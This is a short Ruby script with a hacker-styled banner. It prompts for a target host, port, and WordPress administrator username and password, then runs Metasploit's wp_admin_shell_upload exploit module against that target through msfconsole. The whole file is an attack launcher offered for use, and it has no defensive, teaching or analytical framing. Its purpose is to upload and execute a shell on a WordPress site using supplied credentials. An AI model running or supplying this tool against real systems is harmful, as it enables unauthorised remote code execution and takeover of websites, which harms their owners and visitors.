require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
   WordPress Admin Shell Uploads
         
""".red
puts """
	      1st Try {set RPORT 3306, 80}

""".white


puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow
port = gets.chomp


puts " [?] What is The username to authenticate as? ".blue
print "[!] ---> ".yellow
name = gets.chomp

puts " [?] What is the password to authenticate with? ".blue
print " [!] ---> ".yellow
pass = gets.chomp




exec("msfconsole -x 'use exploit/unix/webapp/wp_admin_shell_upload' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'setg USERNAME #{name}' -x 'setg PASSWORD #{pass}' -x 'run'")

